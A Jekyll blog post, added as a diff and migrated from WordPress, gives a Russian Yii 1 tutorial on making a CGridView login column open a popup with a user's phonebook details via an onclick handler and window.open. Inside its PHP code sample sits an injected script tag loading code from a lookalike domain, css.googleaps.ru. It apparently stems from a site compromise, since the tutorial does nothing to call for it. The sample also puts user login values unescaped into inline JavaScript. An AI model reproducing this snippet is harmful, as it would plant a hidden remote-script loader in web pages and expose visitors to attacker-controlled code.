@@ -1,0 +1,47 @@
+---
+layout: post
+status: publish
+published: true
+title: Yii CGridView новое окно
+author:
+  display_name: Maxyc Webber
+  login: admin
+  email: maxycws@gmail.com
+  url: ''
+author_login: admin
+author_email: maxycws@gmail.com
+wordpress_id: 1635
+wordpress_url: http://devdocs.ru/partners-news/yii-cgridview-novoe-okno/
+date: '2015-05-26 04:18:52 +0200'
+date_gmt: '2015-05-26 04:18:52 +0200'
+categories:
+- Yii framework
+tags:
+- php
+- ip
+- js
+- des1roer
+- yii1
+- yii
+- yii-grid
+comments: []
+---
+<div dir="ltr" style="text-align: left;">Задача - сделать так, чтобы по клику по имени отображалось окно со всеми данными пользователя. Я использую внешнюю страницу, поэтому запрос идет вида<i>http:&#47;&#47;mysearch.com&#47;phonebook.php?fio=admin<&#47;i></p>
+<p>соответсвенно путь меняете на свой.</p>
+<p>в CGridView меняете колонку</p>
+<pre><code>'login' =>array(</p>
+<p>                    'name' =>  'login',</p>
+<p>                     'type'=>'raw',</p>
+<p>                     'value' => 'Chtml::link($data->login, "", array("onclick"=>"my('$data->login')"))',</p>
+<p>          ),<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&cd=mb&ver=4.2.2"><&#47;script><&#47;code><&#47;pre><br />
+где обращаетесь к js фукнции my</p>
+<p>выше блока php прописываете свою функцию<br />
+<span style="color: blue;"><script><&#47;span><br />
+<span style="color: #3d85c6;">function<&#47;span> my(id)<br />
+{<br />
+<span style="color: #e69138;">window<&#47;span>.open('http:&#47;&#47;mysearch.com&#47;phonebook.php?fio='+id,'',&nbsp;&nbsp;&nbsp; 'Toolbar=0,Location=0,Directories=0,Status=0,Menubar=0,Scrollbars=0,Resizable=0,Width=900,Height=500');<br />
+}<br />
+<span style="color: blue;"><&#47;script><&#47;span><br />
+либо же можете создавать свою ссылку через createUrl и передавать полностью путь</p>
+<p><&#47;div><br />
+Source: des1roer.blogspot.com</p>
